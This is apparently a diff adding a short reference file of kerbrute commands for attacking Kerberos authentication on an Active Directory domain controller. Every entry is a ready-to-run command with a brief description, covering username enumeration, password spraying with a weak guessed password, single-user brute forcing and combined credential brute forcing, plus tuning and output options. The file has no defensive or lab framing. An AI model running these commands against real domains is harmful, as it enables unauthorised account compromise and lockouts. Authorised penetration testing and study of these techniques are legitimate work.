@@ -1,0 +1,40 @@
+[X] Kerbrute Command List
+
+[\] kerbrute userenum -d example.local --dc 192.168.1.10 users.txt
+[/] Enumerate valid usernames via Kerberos
+
+[\] kerbrute passwordspray -d example.local --dc 192.168.1.10 users.txt Password123
+[/] Perform password spray attack
+
+[\] kerbrute bruteuser -d example.local --dc 192.168.1.10 passwords.txt user
+[/] Bruteforce password for a single user
+
+[\] kerbrute bruteforce -d example.local --dc 192.168.1.10 users.txt passwords.txt
+[/] Bruteforce usernames and passwords
+
+[\] kerbrute userenum -d example.local --dc dc.example.local users.txt -o valid_users.txt
+[/] Save valid usernames to file
+
+[\] kerbrute passwordspray -d example.local --dc 192.168.1.10 users.txt Password123 -o spray.txt
+[/] Save password spray results
+
+[\] kerbrute userenum -d example.local --dc 192.168.1.10 users.txt -t 10
+[/] Set number of threads
+
+[\] kerbrute userenum -d example.local --dc 192.168.1.10 users.txt --safe
+[/] Safe mode (avoid account lockouts)
+
+[\] kerbrute userenum -d example.local --dc 192.168.1.10 users.txt --verbose
+[/] Enable verbose output
+
+[\] kerbrute userenum -d example.local --dc 192.168.1.10 users.txt --delay 100
+[/] Add delay between requests (ms)
+
+[\] kerbrute userenum -d example.local --dc 192.168.1.10 users.txt --outfile results.txt
+[/] Write results to file
+
+[\] kerbrute --help
+[/] Show help menu
+
+[\] kerbrute --version
+[/] Show version
